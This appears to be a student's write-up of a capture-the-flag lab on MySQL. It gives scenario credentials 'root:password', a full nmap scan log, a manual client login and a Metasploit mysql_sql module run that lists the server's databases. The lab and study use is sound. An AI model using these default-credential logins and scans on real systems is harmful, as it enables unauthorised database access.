### Details
username = root
password=password

**The Scenario**  

Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **credentials: "root:password"** while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

**Requirements**

You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using `sudo apt install default-mysql-client`. Don't worry- this won't install the server package on your system- just the client.

----
1. Installed mysql client on the Kali machine 
2. Ran a port scan found 2 ports open  22 and 3306
```shell
nmap -A  -sX -p-  -oN scan1 10.10.93.56 --vv
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 21:36 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Initiating Ping Scan at 21:36
Scanning 10.10.93.56 [4 ports]
Completed Ping Scan at 21:36, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:36
Completed Parallel DNS resolution of 1 host. at 21:36, 0.01s elapsed
Initiating XMAS Scan at 21:36
Scanning 10.10.93.56 [65535 ports]
Completed XMAS Scan at 21:36, 13.22s elapsed (65535 total ports)
Initiating Service scan at 21:36
Scanning 2 services on 10.10.93.56
Discovered open port 22/tcp on 10.10.93.56
Discovered open|filtered port 22/tcp on 10.10.93.56 is actually open
Discovered open port 3306/tcp on 10.10.93.56
Discovered open|filtered port 3306/tcp on 10.10.93.56 is actually open
Completed Service scan at 21:36, 0.03s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.93.56
Retrying OS detection (try #2) against 10.10.93.56
Retrying OS detection (try #3) against 10.10.93.56
Initiating Traceroute at 21:37
Completed Traceroute at 21:37, 0.03s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:37
Completed Parallel DNS resolution of 2 hosts. at 21:37, 0.01s elapsed
NSE: Script scanning 10.10.93.56.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:37
Completed NSE at 21:37, 0.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:37
Completed NSE at 21:37, 0.17s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:37
Completed NSE at 21:37, 0.00s elapsed
Nmap scan report for 10.10.93.56
Host is up, received reset ttl 63 (0.010s latency).
Scanned at 2022-11-27 21:36:45 EST for 21s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON       VERSION
22/tcp   open  ssh     tcp-response OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDARp2fsEfGdkpZ2uvqlphanguxnImgdsVWYrdVW5RbwGsYtaaUtG317kP0AL+p2C5yOIoSZ7Gu9ZXmkDp7NsoNORakEA2liQx28cW9aac2UyvFwj91skg2UklKyPIQDVmxy8/n90MrsS6njShjgQV9fpW5AKYToQLbQRFkA4WycCOJgTsHqIOk0nshwTAcjkB6+BkCq4z12em6AuBDLAVN3CflrryG8+7WK6jCrgy1/uxitavbgjisLxzQK73pcRRbfZysiKhFi+ILA993pZiRMufaKEbIiLiqhKoO8L2azYubLLFzLdoDSVuItUE5S6pCUd3MZnPcGjS3jvG3l0sB
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGL5ew9bb0sGn6weQ2A2iQHt5Cp5oH5UA+LKbHSmmvJxew3luqjVo7PbvyTqNIW9MLWw1enq8+180yR4sZ4hZBg=
|   256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOSrsLKHkaEMJg3PX0y9pMtpfAYlRXTf0z2qSORHoemr
3306/tcp open  mysql   tcp-response MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, LongPassword, DontAllowDatabaseTableColumn, ConnectWithDatabase, Speaks41ProtocolOld, SupportsCompression, SupportsLoadDataLocal, FoundRows, SwitchToSSLAfterHandshake, IgnoreSigpipes, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x18y6l\x1Fp<w\x1FW}\x10e\x07pZa\x0C\x03c
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.29_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-23T10:13:27
| Not valid after:  2030-04-21T10:13:27
| MD5:   14e6 6c5f 93ac 342e 43da 5a92 48d1 df0c
| SHA-1: 1250 60a1 35a8 b899 0da7 f0eb fa6d 50b9 b3cb 77a7
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjI5X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIwMDQyMzEwMTMyN1oXDTMwMDQyMTEwMTMyN1owQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4yOV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDE1jVm401gVggEGGV6+tvS
| GAp4yoeKEVOFuNPhxpIBVRMASmGahnPxOw5jrQnZkTohBG0QYwZK2a66hFRSEKwu
| DaJLMbFmdK+/7IxxTbm7mqDOPbWRR4C1WXTl26o6HSADqqMJvGlnWxyLoehixBDw
| 91OukKEBbCig2n54fp4zrRBjbeCRxa3OPKbO/wpOtpg7GM7chWspDr3vqfIH8tY1
| ldQ1dUgLaDNFIgIUvWDDPU9WVZro6fzHhrKkpdm40ra2UXLVO6NtGoWXlAjzK4J3
| rDUn95OaI2A74pwNhL0dyd62X6XYIEIwh6dNsDrhUeM34aLdAfAM2a9+PYFexKjT
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACFlFTXG
| s67m/pgvMB26+aVSAURjXN+Neb0pxKZ6Rk0vDk0igRENCvccF9SIrZzIwTI8+kU1
| VV+e5WebNUENm+IS+AJphwyOoHHnBUYcGF/dSfqMhHRNQkRDMI2YpiDCtXssEieH
| K3ZA3xbEo7owQpM6QEQwxlgLt1R8FNh2xe63tTtnRFPwi0V+HG6fv4Ko0Jl2ghan
| e4FPTDbIYPUPbM0C/eyUyVUCKN5xgSvbFqBuO/Ovm53uF2cu3GaMqeJVTDmJfkk+
| 8MBPVmfZwEl/gIJymG17ydTNH0hBlw8dM4ZSvjmKvKZI7ZUd0HPqNS3njQjG0G8s
| wsdeP5hVa8afyBo=
|_-----END CERTIFICATE-----
OS fingerprint not ideal because: maxTimingRatio (1.636000e+00) is greater than 1.4
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=11/27%OT=22%CT=1%CU=31699%PV=Y%DS=2%DC=T%G=N%TM=63841ED2%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.559 days (since Fri Nov 25 08:12:08 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.54 ms 10.9.0.1
2   16.06 ms 10.10.93.56

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:37
Completed NSE at 21:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:37
Completed NSE at 21:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:37
Completed NSE at 21:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
           Raw packets sent: 65653 (2.629MB) | Rcvd: 65586 (2.626MB)

```
3. logged in manually to check that the creds work
```shell
mysql -h 10.10.93.56 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

#then exited the connection
```

4. Launched  Metasploit and set the script to  be used. set the RHOSTS to be the Ip of the victim
```shell
use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified
                                          username
   RHOSTS                      yes       The target host(s), see https:
                                         //github.com/rapid7/metasploit
                                         -framework/wiki/Using-Metasplo
                                         it
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate a
                                         s

msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.93.56
RHOSTS => 10.10.93.56
msf6 auxiliary(admin/mysql/mysql_sql) > 

```

5. Ran the exploit with both the default and custom query
```shell
msf6 auxiliary(admin/mysql/mysql_sql) > exploit
[*] Running module against 10.10.93.56

[*] 10.10.93.56:3306 - Sending statement: 'select version()'...
[*] 10.10.93.56:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
SQL => show databases
msf6 auxiliary(admin/mysql/mysql_sql) > exploit
[*] Running module against 10.10.93.56

[*] 10.10.93.56:3306 - Sending statement: 'show databases'...
[*] 10.10.93.56:3306 -  | information_schema |
[*] 10.10.93.56:3306 -  | mysql |
[*] 10.10.93.56:3306 -  | performance_schema |
[*] 10.10.93.56:3306 -  | sys |
[*] Auxiliary module execution completed

```